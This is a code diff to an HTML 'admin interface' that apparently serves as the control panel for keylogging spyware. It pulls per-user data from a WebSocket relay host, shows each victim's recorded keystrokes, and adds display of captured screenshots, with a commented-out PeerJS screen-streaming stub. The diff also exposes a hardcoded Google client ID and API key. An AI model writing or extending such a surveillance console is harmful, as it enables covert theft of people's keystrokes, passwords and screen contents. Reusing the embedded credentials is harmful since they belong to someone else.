@@ -3,6 +3,7 @@
   <head>
     <title>管理介面</title>
     <meta charset="utf-8" />
+    <meta HTTP-EQUIV="EXPIRES" CONTENT="Mon, 22 Jul 2002 11:12:01 GMT">
   </head>
   <body>
     <p>管理介面</p>
@@ -14,11 +15,15 @@
     <pre id="content" style="white-space: pre-wrap;"></pre>
 
     <hr>
-
+    <img id="screen" width="640">
     <div id="keyRecord">
 
     </div>
-    <script typr="text/javascript" src="jquery-3.6.1.min.js"></script>
+
+    <canvas></canvas>
+
+    <script type="text/javascript" src="jquery-3.6.1.min.js"></script>
+    <script type="text/javascript" src="peerjs.min.js"></script>
     <script type="text/javascript">
         const CLIENT_ID = '366215724019-qqo1q5nlos02ac5ii4a55sfqqrs04tsl.apps.googleusercontent.com';
         const API_KEY = 'AIzaSyCBywDDiNawTCa4fXeO6teysyZxtaNaUgg';
@@ -34,6 +39,25 @@
 
         document.getElementById('authorize_button').style.visibility = 'hidden';
         document.getElementById('signout_button').style.visibility = 'hidden';
+
+        let rnd_id = uuidv4();
+        /*
+        console.log(rnd_id);
+        let peer = new Peer(rnd_id, {
+            host: 'localhost',
+            port: 8000,
+            path: '/myapp',
+            debug: 3
+        });
+        peer.on('call', function(call) {
+            const canvasElt = document.querySelector('canvas');
+            const stream = canvasElt.captureStream(25); // 25 FPS
+            call.answer(stream);
+            call.on('stream', function(remoteStream) {
+                console.log("on stream");
+            });
+        });
+        */
 
         function gapiLoaded() {
             gapi.load('client', initializeGapiClient);
@@ -96,8 +120,16 @@
             socket = new WebSocket("wss://ws-log.herokuapp.com");
             socket.onmessage = function(e) {
                 let data = e.data.split(":");
-                if(data[0] == userId) {
-                    $("#keyRecord").append(data[1]);
+                let uid = data[0];
+                let cmd = data[1];
+                let val = data[2];
+                if(uid == userId) {
+                    console.log(cmd);
+                    if(cmd == "key") {
+                        $("#keyRecord").append(val);
+                    } else if(cmd == "screen") {
+                        $("#screen").attr("src", "data:image/png;base64, " + val);
+                    }
                 }
             };
             socket.onclose = function(e) {
@@ -152,7 +184,24 @@
         function showUser(uid) {
             $("#keyRecord").html("");
             userId = uid;
+            //showScreen(uid);
         }
+
+        function uuidv4() {
+            return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+                (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
+            );
+        }
+
+        function showScreen(uid) {
+            const canvasElt = document.querySelector('canvas');
+            const stream = canvasElt.captureStream(25);
+            var call = peer.call(uid, stream);
+            call.on('stream', function(remoteStream) {
+                console.log("Online");
+            });
+        }
+
     </script>
     <script async defer src="https://apis.google.com/js/api.js" onload="gapiLoaded()"></script>
     <script async defer src="https://accounts.google.com/gsi/client" onload="gisLoaded()"></script>
